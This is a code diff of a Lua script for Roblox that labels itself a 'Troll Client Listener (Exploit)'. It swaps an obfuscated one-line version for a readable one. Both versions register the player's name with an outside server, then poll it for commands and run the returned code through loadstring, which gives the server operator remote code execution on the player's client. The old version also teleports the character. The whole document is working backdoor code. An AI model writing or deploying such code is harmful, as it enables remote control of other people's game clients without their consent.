@@ -1,1 +1,83 @@
-local v0=game:GetService("HttpService");local v1=game:GetService("Players");local v2=v1.LocalPlayer;local v3="https://serveron-production.up.railway.app";local function v4() local v8=0 + 0 ;local v9;while true do if (v8==(878 -(282 + 595))) then return nil;end if (v8==(0 -0)) then v9={http_request,syn and syn.request ,fluxus and fluxus.request ,krnl and krnl.request };for v14,v15 in ipairs(v9) do if (typeof(v15)=="function") then return v15;end end v8=1 + 0 ;end end end local v5=v4();if  not v5 then return;end local function v6(v10) pcall(function() v5({Url=v3   .. "/log" ,Method="POST",Headers={["Content-Type"]="application/json"},Body=v0:JSONEncode({log=v10})});end);end local v7=v0:JSONEncode({name=v2.Name});pcall(function() v5({Url=v3   .. "/connect" ,Method="POST",Headers={["Content-Type"]="application/json"},Body=v7});end);v6("script loaded ✅  : "   .. v2.Name );task.spawn(function() while task.wait(182 -(67 + 113) ) do local v11=0 -0 ;local v12;local v13;while true do if (v11==(1065 -(68 + 997))) then v12,v13=pcall(function() return v5({Url=v3   .. "/command" ,Method="GET"});end);if (v12 and v13 and v13.Body) then local v16,v17=pcall(function() return v0:JSONDecode(v13.Body);end);if (v16 and v17 and v17.action) then if ((v17.action=="execute") and v17.code) then local v18,v19=pcall(function() loadstring(v17.code)();end);if v18 then v6("[client] 🖥️ injection lua succes");else v6("[client] ❌ Error during execution : "   .. tostring(v19) );end elseif (v17.action=="tp") then local v20=v2.Character;if (v20 and v20.PrimaryPart) then local v21=1270 -(226 + 1044) ;while true do if (v21==(0 -0)) then v20:SetPrimaryPartCFrame(v20.PrimaryPart.CFrame + Vector3.new(0,417 -(32 + 85) ,0 + 0 ) );v6("[serv] tp done (300 studs)");break;end end end end end end break;end end end end);
+--== Troll Client Listener (Exploit) ==--
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local SERVER_URL = "https://serveron-production.up.railway.app" -- ton server Railway
+
+-- Fonction pour trouver une fonction HTTP valide
+local function getRequestFunction()
+    local funcs = {
+        http_request,
+        syn and syn.request,
+        fluxus and fluxus.request,
+        krnl and krnl.request
+    }
+
+    for _, fn in ipairs(funcs) do
+        if typeof(fn) == "function" then
+            warn("[CLIENT] Fonction HTTP trouvée :", tostring(fn))
+            return fn
+        end
+    end
+
+    warn("[CLIENT] ❌ Aucune fonction HTTP valide trouvée.")
+    return nil
+end
+
+local request = getRequestFunction()
+if not request then return end
+
+-- Fonction pour envoyer un log au serveur
+local function sendLog(msg)
+    pcall(function()
+        request({
+            Url = SERVER_URL .. "/log",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ log = msg })
+        })
+    end)
+end
+
+-- Enregistrer le client
+pcall(function()
+    request({
+        Url = SERVER_URL .. "/connect",
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode({ name = LocalPlayer.Name })
+    })
+end)
+warn("[CLIENT] ✅ Client enregistré :", LocalPlayer.Name)
+sendLog("[CLIENT] Connecté sur le serveur")
+
+-- Boucle pour récupérer du code à exécuter
+task.spawn(function()
+    while task.wait(2) do
+        local success, response = pcall(function()
+            return request({
+                Url = SERVER_URL .. "/command",
+                Method = "GET"
+            })
+        end)
+
+        if success and response and response.Body then
+            local ok, decoded = pcall(function()
+                return HttpService:JSONDecode(response.Body)
+            end)
+
+            if ok and decoded and decoded.code then
+                local codeToExec = decoded.code
+                local execOk, err = pcall(function()
+                    loadstring(codeToExec)()
+                end)
+                if execOk then
+                    sendLog("[CLIENT] Code exécuté avec succès")
+                else
+                    sendLog("[CLIENT] Erreur lors de l'exécution : " .. tostring(err))
+                end
+            end
+        end
+    end
+end)
